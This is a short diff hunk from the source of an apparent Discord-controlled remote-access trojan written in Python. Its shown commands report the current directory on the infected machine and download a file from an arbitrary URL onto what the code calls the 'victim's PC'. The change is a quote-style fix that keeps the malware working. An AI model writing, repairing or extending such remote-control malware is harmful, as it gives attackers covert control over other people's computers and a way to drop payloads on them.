@@ -152,7 +152,7 @@ async def getcwd(ctx):
     await ctx.response.send_message(embed=EmbedGen("Current directory", "The present directory is: ", f"```{os.getcwd()}```"))
     
 @client.slash_command(description="Uploads file to victim's PC", guild_ids=server_ids)
-async def upload(ctx, url, file_name, file_path=f"C:\\Users\\{os.getenv("username")}"):
+async def upload(ctx, url, file_name, file_path=f"C:\\Users\\{os.getenv('username')}"):
     try: os.chdir(file_path)
     except: return await ctx.response.send_message("invalid dir")
     r = get(url, allow_redirects=True)
